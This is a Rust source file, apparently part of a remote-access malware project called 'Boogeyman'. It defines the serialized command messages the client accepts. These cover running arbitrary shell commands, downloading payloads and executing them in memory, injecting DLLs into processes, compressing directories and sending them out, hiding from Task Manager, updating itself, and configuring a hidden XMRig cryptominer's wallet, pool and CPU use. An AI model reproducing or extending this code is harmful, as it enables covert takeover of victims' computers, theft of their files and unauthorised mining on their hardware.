use serde::{ Deserialize, Serialize };

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BoogeymanReceivePayload {
    pub action: ClientAction,
    pub params: ClientParams,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ClientAction {
    UninstallSelf,
    UpdateSelf,
    CallTerminalCommand,
    DownloadAndExecFileInMemory,
    DownloadFile,
    ExecLocalFile,
    FetchLogs,
    CompressDirAndSend,
    CallSysEvent,
    FetchDynamicData,
    FetchThumbnail,
    UpdateTaskManagerExclusions,
    EditXMRigConfig,
    InjectDll,
    GetXMRigData,
    EditMinerCPULimit,
    // other file stuff just use some FTP
    // remove, rename, upload (if folder - compress),createfolder
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ClientParams {
    UninstallSelf(UninstallSelfParams),
    UpdateSelf(UpdateSelfParams),
    UpdateTaskManagerExclusions(UpdateTaskManagerExclusionsParams),
    CallTerminalCommand(CallTerminalCommandParams),
    CallSysEvent(CallSysEventParams),
    ExecLocalFile(ExecLocalFileParams),
    EditXMRigConfig(EditXMRigConfigParams),
    FetchDynamicData(FetchDynamicDataParams),
    FetchThumbnail(FetchThumbnailParams),
    DownloadFile(DownloadFileParams),
    InjectDll(InjectDllParams),
    GetXMRigData(GetXMRigDataParams),
    EditMinerCPULimit(EditMinerCPULimitParams),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct EditMinerCPULimitParams {
    pub new_cpu_limit: u32,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GetXMRigDataParams {}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct EditXMRigConfigParams {
    // here update - wallet adr, cpu % usage, url and port of pool, etc
    pub config: String,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct InjectDllParams {
    pub pid: u32,
    pub dll_bytes: Vec<u8>,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DownloadFileParams {
    pub abs_path: String,
    pub from_url: Option<String>,
    pub from_bytes: Option<Vec<u8>>,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FetchThumbnailParams {}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FetchDynamicDataParams {}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ExecLocalFileParams {
    pub abs_path: String,
    pub args: Option<String>,
    pub hidden: bool,
    pub wait_for_output: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UninstallSelfParams {}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UpdateSelfParams {
    pub new_version: u64,
    pub update_url: Option<String>,
    pub update_bytes: Option<Vec<u8>>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UpdateTaskManagerExclusionsParams {
    pub include: Vec<String>,
    pub exclude: Vec<String>,
    pub override_full: Option<Vec<String>>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CallTerminalCommandParams {
    pub command: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CallSysEventParams {
    pub event: SysEvent,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum SysEvent {
    Shutdown,
    Restart,
}
